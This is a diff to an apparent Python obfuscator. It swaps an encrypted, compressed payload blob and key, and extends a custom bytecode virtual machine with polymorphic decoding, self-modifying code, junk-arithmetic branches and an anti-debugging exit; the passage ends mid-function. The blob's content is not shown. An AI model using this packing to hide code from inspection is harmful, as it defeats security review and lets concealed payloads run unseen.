@@ -1,14 +1,209 @@
 #!/usr/bin/env python3
-def _drzocix(_hizqhxz):
-    return _hizqhxz % 5598 + 1
+def _rfoacoaks(_zeqyjzfv):
+    return _zeqyjzfv % 4150 + 1
 
-import hashlib as _kwawijcu, hmac as _ilyvmks, base64 as _uxujbpzjd, sys as _jwfcgd, zlib as _dolhi
-_hizqhxz = 560155
-_rtwmhg = """HgPAicwqanUgGsWCQjW8JJVAJXCcIfwohRo4ATPJmDVBsqlT8iCvp7FBq/v4IcjMIab66NGc/pZbs2nUDLHtsB5mEQN9N9TlT6I22wI0JUttWq3f0VozIRLoShC0RcGlRP5cB6D+Lu2NtXv36ypw6HYLxDyAK/n3722spBeJ926MNr7MTOprBMMg2S0F/3OFMZkrQ5XSpC4d6o1mNsz1iIE0obaC/nDl6iMKcq3fUQkiB5jT+/eMPX6ChfHdjolLAGTjYdt1IK9l6iwBEa77bS2t78BIclBb+9HjidOjVVkbhrpXVDnb6sf9oZECJ844MhrxBr3wny/1Xr6CbdjVtw33foufa2X/BwFl6J8T8NNTZDtJ/4hjb8r0t8XKW02bQ3bvtiMpZe7/3V5u4BJtNK2gTJNnsFDU3HrJ33HSSheqpWWSjnUGxR+U7SSp/Vv/WM5/d6IDudiZ3c5YWZNTpjuzfWSZ5/VjVDqf9EWJj5UZSHXIxzeLAmdKKBnlpLvasqYxVq5HfZYtXs0mZT1/1bP1qPQM5FgqXaxDqn77sjprGcBTR812hdda2YDpG/2ju69zAEz0P7yPXqnu7mI8n3Wuv9j3bZRWbvtrqt/wIVD7b+2TtL4xY84kGUf8z2uzg5Kb6zSrTCq5zNOExH3Vf45QiaE8C8VBM9WtsqdCRx+WV7KIaBzHGcBQFG4wyU3zjlUnSDrzJ7TE/sBl6BJZAWq+FpBTBA7kw33ynnyfRpIJy2uQBWwXLDjB8eoLaeHPv/D4PMeppL+M2FGyZnIu28Ow3EbQmX3DjjL0vRXv5aaj5doGdzrBaIlNGIR6+JTbn/ysNlCLnNY2x6QT391sp3Fmki/pidphiNeEy8AwP3kTSFjUHMwT3oaiZMj+Ec0maGTcQxC1l6yQwzzd0mi9lICv1xQZgQAspBfWMNltekhsIvS2ht6r6KKoSZJPMjaK6fu/bji/pLlaCaweL40qORoL15Avhgqkzkb6Ypgx3z54vyQNMDT1Fh7WjCU+Mz8M2Xq3RyFttPJMgKw9TebCPvBTHZOowO9RmA/cacUw4zHpGFec/eJy6l0Lc2ZLnCp0rJJ8s3y4aEeldUmafPbeBPOFEkoD8d+lxtEWZw=="""
-_padllgc = 3
-_jcdvntmg = _drzocix(_hizqhxz)
+import hashlib as _ooyjwkgp, hmac as _dpweyflet, base64 as _nekcm, sys as _kzmuxh, zlib as _ofumrabw
+_zeqyjzfv = 633316
+_ssiqzv = """Vbfjn26YgA6lR3BF71v978KWrxi2qf75yJnPIZ7D8ql2RBJg+4Ot9nLIxYGO/UOMkclh/JQe6ZvpaaRSM1tXz8hC8p/lPlIrWX7Q7+UZXLAjez7P7+13XEC3tOB1hVz8LQQtk7FfwpWIRnJvuhB2GyOA5PlZ5aM/JHi3R3oIjKSu/1SmNM1kpfEg7PnuQeKCylMzZN7GzEJVPeilF2cKHAiNLapQ9AqFC8b45tXgkjr2FgnAML2kSOzjVzNznRxZLZppbISF9hYxNjHZntcxdBz/FShLcPibWN956DBNLsflCQQV8QZ6P9hMq9BvK63F9wQh3bujWPnmDissEA7fxUibsIoChxa90vfp5iEjshtCkxz1H2jHKu7fbTcH/KnAFc4xIdl/RzIDCxgWeEUMp+kjnaX6WtMUasLFYBzVVQje16cT5QwdabajMKP/Vv0c9rQx8/kvO8fGSmg7jK1sycL28WFYP/boM9H92m6FHhzEAU6jVqgnu80K8nemhJC7K3WvDSzPP4WVAdEtKQr7YbdnUZ3h7aaS0VuVtcme5dJ/9L9EY0Kx3HZTagwEjkTQ8IXImbVz+ZRe33V7mOtRXmfNhXuo4EB7cb+ZuQVMrQwT7yQlS53rkYu7c8I0Rz+KZ4MaN4yRcVkc7C8Cjf+vQt+eidXIHQunt6Kkqm4AbGZ+JwujzBpIkWPbuOLVNGf5RU33swXWmkCr634REZjkFIb17mNvzPdV4kPO4e2tjuEmuQ2FwJ0CgQfaK5J/ZHQ8Qh5XpxlFKJLOmevfDD7Rv5N3+RkiAJKLA/XgIuksJCBaHceRdXzXI9E9Vp/nGsK0WDpwtFxllVG7SFgRFu4Kyu8aaJWzg1c66xrRWpiJOW3hZKjrq35EN9R+GEkgIfaSV82dZGecXJLnMHzex6d985MOffo="""
+_vqkbcm = 3
+_agcdbge = _rfoacoaks(_zeqyjzfv)
 
-def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key):
+def _vm_decode_vl(_c, _p, _k, _m, _rm):
+    _tag = _c[_p] ^ _k[_p % 32]
+    _cls = (_tag >> 6) & 0x3
+    if _cls == 0:
+        _op = _m[_tag & 0x0F]
+        _rd = _rm[(_c[_p+1] >> 4) & 0x0F] if _c[_p+1] < 64 else 0
+        _rs1 = _rm[_c[_p+1] & 0x0F] if (_c[_p+1] & 0x0F) < 64 else 0
+        return _op, _rd, _rs1, 0, 0, 2
+    elif _cls == 1:
+        _op = _m[_tag & 0x1F]
+        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
+        _rd = _rm[(_b1 >> 4) & 0x0F] if ((_b1 >> 4) & 0x0F) < 64 else 0
+        _rs1 = _rm[_b1 & 0x0F] if (_b1 & 0x0F) < 64 else 0
+        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
+        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
+        _imm = _b2 | (_b3 << 8)
+        if _imm & 0x8000:
+            _imm = _imm | (-1 << 16)
+        return _op, _rd, _rs1, 0, _imm, 4
+    elif _cls == 2:
+        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
+        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
+        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
+        _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
+        _op = _m[_b1 & 0xFF]
+        _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
+        _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
+        _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
+        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
+        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
+        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
+        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
+        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
+        return _op, _rd, _rs1, _rs2, _imm, 9
+    else:
+        _nb = _tag & 0x0F
+        if _nb == 0:
+            _nb = 1
+        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
+        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
+        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
+        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
+        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
+        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
+        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
+        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
+        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
+        _ilen = 2 + _nb * 8
+        return _op, _rd, _rs1, _rs2, _imm, _ilen
+
+# Polymorphic decoder (handles variant detection)
+def _vm_decode_poly(_c, _p, _k, _m, _rm):
+    _tag = _c[_p] ^ _k[_p % 32]
+    _cls = (_tag >> 6) & 0x3
+    if _cls == 0:
+        # Short class — try variants
+        if _p + 2 <= len(_c) and (_p + 2 >= len(_c) or (_c[_p+2] ^ _k[(_p+2) % 32]) & 0xC0 == 0):
+            # Variant 0 (standard 2B) or detect by checking if next byte looks valid
+            _rd_raw = (_c[_p+1] ^ _k[(_p+1) % 32])
+            _rd = _rm[(_rd_raw >> 4) & 0x0F] if (_rd_raw >> 4 & 0x0F) < 64 else 0
+            _rs1 = _rm[_rd_raw & 0x0F] if (_rd_raw & 0x0F) < 64 else 0
+            return _m[_tag & 0x0F], _rd, _rs1, 0, 0, 2
+        if _p + 3 <= len(_c):
+            # Variant 1 (3B interleaved)
+            # Encoding: tag bits 3-2=rd[1:0], tag bits 1-0=op[3:2]
+            #           out[1] bits 7-6=op[1:0], bits 5-2=rs1[3:0], bits 1-0=rd[4:3]
+            #           out[2] bits 3-0=op[7:4]
+            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
+            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
+            _op_v1 = ((_b2 & 0x0F) << 4) | ((_tag & 0x03) << 2) | ((_b1 >> 6) & 0x03)
+            _rd_v1 = ((_b1 & 0x03) << 2) | ((_tag >> 2) & 0x03)
+            _rs1_v1 = (_b1 >> 2) & 0x0F
+            if _rd_v1 < 64:
+                return _m[_op_v1 & 0xFF], _rm[_rd_v1] if _rd_v1 < 64 else 0, _rm[_rs1_v1] if _rs1_v1 < 64 else 0, 0, 0, 3
+            # Variant 2 (3B scattered)
+            _scat = _tag & 0x0F
+            _op_lo2 = (_b1 >> 6) & 0x03
+            _rd_bits = (_b1 >> 2) & 0x0F
+            _rs1_hi2 = _b1 & 0x03
+            _rs1_lo2 = (_b2 >> 6) & 0x03
+            _scat_hi = (_b2 >> 2) & 0x0F
+            _op_hi2 = _b2 & 0x30
+            _op2 = ((_scat_hi << 4) | _op_hi2 | _op_lo2) & 0xFF
+            _rs1_val = (_rs1_hi2 << 2) | _rs1_lo2
+            if _rd_bits < 64:
+                return _m[_op2], _rm[_rd_bits], _rm[_rs1_val] if _rs1_val < 64 else 0, 0, 0, 3
+        # Fallback
+        return _m[_tag & 0x0F], 0, 0, 0, 0, 2
+    elif _cls == 1:
+        # Medium class — use tag bit 5 for disambiguation
+        _vbit = (_tag & 0x20) != 0
+        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
+        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
+        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
+        _rd0 = (_b1 >> 4) & 0x0F
+        _rs1_0 = _b1 & 0x0F
+        if _p + 4 <= len(_c) and not _vbit:
+            # Variant 0 (standard, bit 5 = 0)
+            _op0 = _tag & 0x1F
+            _imm0 = _b2 | (_b3 << 8)
+            if _imm0 & 0x8000:
+                _imm0 = _imm0 | (-1 << 16)
+            return _m[_op0], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm0, 4
+        elif _vbit and _p + 4 <= len(_c):
+            # Variant 1 (imm in tag, bit 5 = 1)
+            _op1 = (_b3 >> 3) & 0x1F
+            _imm_lo = _tag & 0x1F
+            _imm_hi = (_b2 | ((_b3 & 0x07) << 8))
+            _imm1 = (_imm_hi << 5) | _imm_lo
+            if _imm1 & 0x8000:
+                _imm1 = _imm1 | (-1 << 16)
+            return _m[_op1], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm1, 4
+        # Fallback
+        return 0, 0, 0, 0, 0, 2
+    elif _cls == 2:
+        # Long class
+        _variant = (_tag >> 2) & 0x0F
+        if _variant == 0 and _p + 9 <= len(_c):
+            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
+            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
+            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
+            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
+            _op = _m[_b1 & 0xFF]
+            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
+            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
+            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
+            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
+            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
+            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
+            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
+            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
+            return _op, _rd, _rs1, _rs2, _imm, 9
+        elif _variant == 1 and _p + 9 <= len(_c):
+            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
+            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
+            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
+            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
+            _op = _m[_b2 & 0xFF]
+            _rd = _rm[_b1 & 0x3F] if (_b1 & 0x3F) < 64 else 0
+            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
+            _rs2 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
+            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
+            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
+            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
+            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
+            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
+            return _op, _rd, _rs1, _rs2, _imm, 9
+        elif _variant == 2 and _p + 10 <= len(_c):
+            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
+            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
+            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
+            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
+            _op = _m[_b1 & 0xFF]
+            _rd = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
+            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
+            _rs2 = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
+            _i0 = _c[_p+7] ^ _k[(_p+7) % 32]
+            _i1 = _c[_p+8] ^ _k[(_p+8) % 32]
+            _i2 = _c[_p+5] ^ _k[(_p+5) % 32]
+            _i3 = _c[_p+6] ^ _k[(_p+6) % 32]
+            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
+            return _op, _rd, _rs1, _rs2, _imm, 10
+        # Fallback
+        if _p + 9 <= len(_c):
+            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
+            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
+            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
+            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
+            _op = _m[_b1 & 0xFF]
+            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
+            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
+            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
+            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
+            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
+            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
+            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
+            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
+            return _op, _rd, _rs1, _rs2, _imm, 9
+        return 0, 0, 0, 0, 0, 2
+    else:
+        _nb = _tag & 0x0F
+        if _nb == 0:
+            _nb = 1
+        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
+        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
+        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
+        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
+        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
+        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
+        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
+        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
+        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
+        _ilen = 2 + _nb * 8
+        return _op, _rd, _rs1, _rs2, _imm, _ilen
+
+def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key, _vl_flag, _poly_flag=False):
     import sys
     if sys.gettrace() is not None: sys.exit(1)
     if any(x in globals() for x in ['pdb', 'inspect', 'trace']): sys.exit(1)
@@ -18,20 +213,21 @@ def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key):
     _r = [None] * 64
     _ip = 0
     _cycle = 0
-    _ip_mask = random.getrandbits(32)
     _n = len(_code)
     _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
+    _spill_stack = []
+    _handler_stack = []
+    _vm_flags = 0
+    _smc_key = random.getrandbits(32)
+    if _poly_flag:
+        _decode = lambda: _vm_decode_poly(_code, _ip, _op_key, _map, _reg_map)
+    elif _vl_flag:
+        _decode = lambda: _vm_decode_vl(_code, _ip, _op_key, _map, _reg_map)
+    else:
+        _decode = lambda: _vm_decode_fixed(_code, _ip, _op_key, _map, _reg_map)
     while _ip < _n:
         _cycle += 1
-        
-        _raw = _code[_ip:_ip+8]
-        _dec = bytes([_raw[i] ^ _op_key[i % 32] for i in range(len(_raw))])
-        
-        _op = _map[_dec[0]]
-        _rd = _reg_map[_dec[1]]
-        _rs1 = _reg_map[_dec[2]]
-        _rs2 = _reg_map[_dec[3]]
-        _imm = _dec[4] | (_dec[5] << 8) | (_dec[6] << 16) | (_dec[7] << 24)
+        _op, _rd, _rs1, _rs2, _imm, _ilen = _decode()
         if _op == 0:
             pass
         elif _op == 1:
@@ -76,19 +272,28 @@ def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key):
         elif _op == 25:
             _r[_rd] = _r[_rs1] >= _r[_rs2]
         elif _op == 30:
-            _ip = _imm * 8
+            if _vl_flag:
+                _ip = _imm
+            else:
+                _ip = _imm * 8
             continue
         elif _op == 31:
             if _r[_rd]:
-                _ip = _imm * 8
+                if _vl_flag:
+                    _ip = _imm
+                else:
+                    _ip = _imm * 8
             else:
-                _ip += 8
+                _ip += _ilen
             continue
         elif _op == 32:
             if not _r[_rd]:
-                _ip = _imm * 8
+                if _vl_flag:
+                    _ip = _imm
+                else:
+                    _ip = _imm * 8
             else:
-                _ip += 8
+                _ip += _ilen
             continue
         elif _op == 33:
             _r[_rd] = _r[_rs1][_r[_rs2]]
@@ -96,32 +301,27 @@ def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key):
             _r[_rs1][_r[_rs2]] = _r[_rd]
         elif _op == 40:
             _fn = _r[_rs1]
-            _sfn = _dec[2]
-            _args = tuple(_r[_reg_map[_sfn + 1 + _i]] for _i in range(_imm & 0xFFFF))
+            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF))
             _r[_rd] = _fn(*_args)
         elif _op == 41:
-            _s = _dec[2]
-            _r[_rd] = _names[_rd](*[_r[_reg_map[_s + _i]] for _i in range(_imm & 0xFFFF)])
+            _r[_rd] = _names[_rd](*[_r[_rs1 + _i] for _i in range(_imm & 0xFFFF)])
         elif _op == 42:
             return _r[_rd]
         elif _op == 43:
-            _s = _dec[2]
-            _r[_rd] = tuple(_r[_reg_map[_s + _i]] for _i in range(_dec[3]))
+            _r[_rd] = tuple(_r[_rs1 + _i] for _i in range(_rs2))
         elif _op == 44:
-            _s = _dec[2]
-            _r[_rd] = list(_r[_reg_map[_s + _i]] for _i in range(_dec[3]))
+            _r[_rd] = list(_r[_rs1 + _i] for _i in range(_rs2))
         elif _op == 62:
             _r[_rd] = str(_r[_rs1])
         elif _op == 63:
-            _s = _dec[2]
-            _r[_rd] = ''.join(str(_r[_reg_map[_s + _i]]) for _i in range(_dec[3]))
+            _r[_rd] = ''.join(str(_r[_rs1 + _i]) for _i in range(_rs2))
         elif _op == 70:
             _r[_rd] = iter(_r[_rs1])
         elif _op == 71:
             try:
                 _r[_rd] = next(_r[_rs1])
             except StopIteration:
-                _ip = _imm * 8
+                _ip = _imm
                 continue
         elif _op == 72:
             _r[_rd].extend(_r[_rs1])
@@ -149,21 +349,298 @@ def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key):
                     if _v + 1 == _v: pass
             except TypeError:
                 pass
-        _ip += 8
+
+        # ─── Indirect & Virtual Call ───
+        elif _op == 80:
+            _fn = _r[_rs1]
+            _argc = _imm & 0xFFFF
+            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_argc))
+            _r[_rd] = _fn(*_args)
+        elif _op == 81:
+            _obj = _r[_rs1]
+            _vtable = _r[_rs1 + 1]
+            _midx = _imm & 0xFFFF
+            _argc = (_imm >> 16) & 0xFFFF
+            _method = _vtable[_midx]
+            _args = tuple(_r[_rs1 + 2 + _i] for _i in range(_argc))
+            _r[_rd] = _method(_obj, *_args)
+
+        # ─── Exception Handling ───
+        elif _op == 90:
+            _handler_stack.append({'s': _ip, 'e': _ip + _imm, 'c': None, 't': None})
+        elif _op == 91:
+            if _handler_stack:
+                _handler_stack[-1]['t'] = _r[_rd]
+                _handler_stack[-1]['c'] = _ip + _ilen
+        elif _op == 92:
+            _exc = _r[_rs1]
+            _found = False
+            for _h in reversed(_handler_stack):
+                if _h['s'] <= _ip <= _h['e']:
+                    if _h['t'] is None or isinstance(_exc, _h['t']):
+                        _ip = _h['c']
+                        _r[_rs1] = _exc
+                        _found = True
+                        break
+            if not _found:
+                raise _exc
+            continue
+        elif _op == 93:
+            if _handler_stack:
+                _handler_stack.pop()
+
+        # ─── Obfuscated Conditional Branching ───
+        elif _op == 100:
+            _v = _r[_rd]
+            _t1 = (_v & _v) | _v
+            _t2 = (_t1 ^ 0) + 0
+            _t3 = _t2 ^ _t2
+            if _t3 == 0:
+                if _t2:
+                    _ip = _imm
+                else:
+                    _ip += _ilen
+                continue
+        elif _op == 101:
+            _v = _r[_rd]
+            _t1 = _v | 0
+            _t2 = _t1 & _t1
+            if (_t2 ^ _t2) == 0:
+                if not _t2:
+                    _ip = _imm
+                else:
+                    _ip += _ilen
+                continue
+        elif _op == 102:
+            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
+            _o = _r[_rd] ^ _r[_rd] if isinstance(_r[_rd], int) else 0
+            if _o == 0:
+                if _d == 0:
+                    _ip = _imm
+                else:
+                    _ip += _ilen
+                continue
+        elif _op == 103:
+            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
+            _m = _r[_rd] | 0 if isinstance(_r[_rd], int) else 0
+            if _m == _m:
+                if _d != 0:
+                    _ip = _imm
+                else:
+                    _ip += _ilen
+                continue
+        elif _op == 104:
+            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
+            _t = (_d ^ _d) & 0
+            if _t == 0:
+                if _d < 0:
+                    _ip = _imm
+                else:
+                    _ip += _ilen
+                continue
+        elif _op == 105:
+            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
+            _o = _r[_rs1] ^ _r[_rs1] if isinstance(_r[_rs1], int) else 0
+            if _o == 0:
+                if _d <= 0:
+                    _ip = _imm
+                else:
+                    _ip += _ilen
+                continue
+        elif _op == 106:
+            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
+            if (_d * 0) == 0:
+                if _d > 0:
+                    _ip = _imm
+                else:
+                    _ip += _ilen
+                continue
+        elif _op == 107:
+            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
+            _v = _r[_rd] & 0xFFFFFFFF if isinstance(_r[_rd], int) else 0
+            if (_v ^ _v) == 0:
+                if _d >= 0:
+                    _ip = _imm
+                else:
+                    _ip += _ilen
+                continue
+        elif _op == 108:
+            _target = _r[_rd]
+            if isinstance(_target, int) and 0 <= _target < _n:
+                _ip = _target
+            else:
+                _ip = 0
+            continue
+        elif _op == 109:
+            _idx = _r[_rd]
+            _table_base = _imm & 0xFFFF
+            _default_off = (_imm >> 16) & 0xFFFF
+            _num_entries = _rs1 & 0xFF
+            if isinstance(_idx, int) and 0 <= _idx < _num_entries:
+                _entry_off = _table_base + _idx * 4
+                if _entry_off + 4 <= _n:
+                    _off = (_code[_entry_off] | (_code[_entry_off+1] << 8) | (_code[_entry_off+2] << 16) | (_code[_entry_off+3] << 24))
+                    _ip += _off
+                else:
+                    _ip += _default_off
+            else:
+                _ip += _default_off
+            continue
+
+        # ─── Register Spilling ───
+        elif _op == 120:
+            _spill_stack.append(_r[_rd])
+        elif _op == 121:
+            if _spill_stack:
+                _r[_rd] = _spill_stack.pop()
+        elif _op == 122:
+            _mask = _imm & 0xFFFF
+            for _b in range(16):
+                if _mask & (1 << _b):
+                    _reg = _rd + _b
+                    if _reg < 64 and _reg < len(_r):
+                        _spill_stack.append(_r[_reg])
+                        _r[_reg] = None
+        elif _op == 123:
+            _cnt = _imm & 0xFF
+            for _ in range(min(_cnt, len(_spill_stack))):
+                _spill_stack.pop()
+
+        # ─── Self-Modifying Code ───
+        elif _op == 130:
+            _off = _r[_rd]
+            _plen = _r[_rs1]
+            _key = _r[_rs2]
+            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
+                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
+                    _ks = _key.to_bytes(8, 'little')
+                    for _i in range(min(_plen, 8)):
+                        _code[_off + _i] ^= _ks[_i % len(_ks)]
+        elif _op == 131:
+            _shuf = _rd & 0xFF
+            _new_op = _rs1 & 0xFF
+            if _shuf < 256:
+                _map[_shuf] = _new_op
+        elif _op == 132:
+            _off = _r[_rd]
+            _plen = _r[_rs1]
+            _key = _r[_rs2]
+            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
+                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
+                    _seed = _key ^ _cycle
+                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
+                    for _i in range(_plen):
+                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
+                        _code[_off + _i] ^= (_rng >> 16) & 0xFF
+        elif _op == 133:
+            _off = _r[_rd]
+            _plen = _r[_rs1]
+            _key = _r[_rs2]
+            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
+                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
+                    _seed = _key ^ _cycle
+                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
+                    for _i in range(_plen):
+                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
+                        _code[_off + _i] ^= (_rng >> 16) & 0xFF
+
+        # ─── Data Obfuscation ───
+        elif _op == 140:
+            _v = _r[_rs1]
+            _t = (_v ^ _v) & 0
+            _r[_rd] = _t | _v
+        elif _op == 141:
+            _v = _r[_rs1] + _r[_rs2]
+            _m = _r[_rs1] ^ _r[_rs2]
+            _r[_rd] = _v + _m - _m
+        elif _op == 142:
+            _v = _r[_rs1]
+            _k = _r[_rs2]
+            if isinstance(_v, int) and isinstance(_k, int):
+                _r[_rd] = (_v | _k) - (_v & _k) + (_v & _k) - (_v | _k) + (_v ^ _k)
+            else:
+                _r[_rd] = _v
+
+        # ─── Control Flow Integrity (opcodes 150-152) ───
+        elif _op == 150:
+            _exp_lo = _rd & 0xFF
+            _exp_mid = _rs1 & 0xFF
+            _exp_hi = _rs2 & 0xFF
+            _exp_top = (_imm >> 24) & 0xFF if _imm < 0 else (_imm >> 24) & 0xFF
+            _expected = _exp_lo | (_exp_mid << 8) | (_exp_hi << 16) | (_exp_top << 24)
+            _csum = 0xFFFFFFFF
+            _start = _ip - _ilen if _ip >= _ilen else 0
+            _end = _ip + 1
+            for _ci in range(_start, min(_end, len(_code))):
+                _csum ^= _code[_ci]
+                _csum = ((_csum << 7) | (_csum >> 25)) & 0xFFFFFFFF
+                _csum ^= (_csum >> 13)
+            _csum ^= 0xFFFFFFFF
+            if (_csum & 0xFFFFFFFF) != (_expected & 0xFFFFFFFF):
+                import sys
+                sys.stderr.write('error: CFI violation detected\\n')
+                sys.exit(1)
+        elif _op == 151:
+            import sys
+            sys.stderr.write('error: integrity failure\\n')
+            sys.exit(1)
+        elif _op == 152:
+            pass
+
+        # ─── Constant Decryption (opcode 160) ───
+        elif _op == 160:
+            _r[_rd] = _consts[_imm]
+            if isinstance(_r[_rd], str):
+                pass
+
+        _ip += _ilen
+
+def _vm_decode_fixed(_c, _p, _k, _m, _rm):
+    _raw = _c[_p:_p+8]
+    _dec = bytes([_raw[i] ^ _k[i % 32] for i in range(len(_raw))])
+    _op = _m[_dec[0]]
+    _rd = _rm[_dec[1] & 0x3F] if (_dec[1] & 0x3F) < 64 else 0
+    _rs1 = _rm[_dec[2] & 0x3F] if (_dec[2] & 0x3F) < 64 else 0
